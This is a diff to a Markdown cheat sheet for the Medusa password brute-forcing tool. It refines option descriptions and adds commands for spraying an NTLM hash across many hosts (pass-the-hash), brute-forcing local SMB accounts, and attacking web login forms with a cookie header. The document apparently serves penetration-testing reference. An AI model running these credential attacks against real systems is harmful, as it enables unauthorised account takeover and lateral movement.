@@ -31,13 +31,14 @@ medusa -M ssh -q
 | `-p PASS` / `-P FILE` | Single password or password list |
 | `-M MODULE` | Protocol module to use |
 | `-m "OPTIONS"` | Module-specific options |
-| `-t TASKS` | Parallel tasks per host (default: 4) |
+| `-t TASKS` | Parallel logins tested concurrently (per host) |
 | `-T HOSTS` | Total number of hosts to test simultaneously |
+| `-L` | One username per thread (parallelise logins) |
 | `-f` | Stop after first valid login on current host |
 | `-F` | Stop after first valid login on any host |
 | `-n PORT` | Non-default port |
-| `-e ns` | Try null password and username-as-password |
-| `-v LEVEL` | Verbosity (0–6, default 5) |
+| `-e ns` | Try null password (`n`) and username-as-password (`s`) |
+| `-v LEVEL` | Verbosity level (0–6, higher = more) |
 | `-O FILE` | Log output to file |
 
 ---
@@ -69,7 +70,19 @@ medusa -h 10.10.10.10 -U users.txt -p 'Password123' -M rdp
 
 ```bash
 medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M smbnt
+
+# Pass-the-Hash — give the NTLM hash as the "password" and set PASS:HASH.
+# Combined with -H hosts.txt this sprays one hash across a whole subnet.
+medusa -H hosts.txt -u administrator -p <NTLM_hash> -M smbnt -m PASS:HASH -F
+
+# Target LOCAL accounts (not the domain); force SMB2 if v1 is disabled
+medusa -h 10.10.10.10 -u administrator -p 'Passw0rd!' -M smbnt -m GROUP:LOCAL -m MODE:SMB2
 ```
+
+> [!tip] **smbnt is a PtH sweeper.** `-m PASS:HASH` accepts an NTLM hash in place of a
+> password, so a single dumped hash + `-H hosts.txt` finds every box it's local-admin on
+> — the classic "where can this hash log in?" question. NetExec does this too with richer
+> output, but medusa is handy when you want a quick, dependency-light spray.
 
 ### HTTP Basic Auth
 
@@ -79,10 +92,21 @@ medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M http -m DIR:/admin
 
 ### HTTP Form (POST)
 
+Medusa's web-form module is **not** like Hydra: it fills the username/password fields
+**by name** and takes no `^USER^`/`^PASS^` placeholders. Split the config across three
+options — `FORM:` = the path, `FORM-DATA:<method>?<fields>` = the fields (username field
+first, password second, both left blank), `DENY-SIGNAL:` = the failure string.
+
 ```bash
 medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M web-form \
-  -m "FORM:username=^USER^&password=^PASS^" \
-  -m "DENY:Invalid credentials"
+  -m FORM:"/login" \
+  -m FORM-DATA:"post?username=&password=" \
+  -m DENY-SIGNAL:"Invalid credentials"
+
+# Add a cookie / CSRF header with CUSTOM-HEADER (repeatable)
+medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M web-form \
+  -m FORM:"/login" -m FORM-DATA:"post?user=&pass=" \
+  -m DENY-SIGNAL:"incorrect" -m CUSTOM-HEADER:"Cookie: PHPSESSID=abc123"
 ```
 
 ### MySQL / MSSQL
@@ -147,5 +171,5 @@ medusa -H hosts.txt -u admin -P passwords.txt -M ssh -T 10 -t 2
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-23*
-*Model: claude-opus-5*
+*Updated: 2026-09-28*
+*Model: claude-opus-4-8*
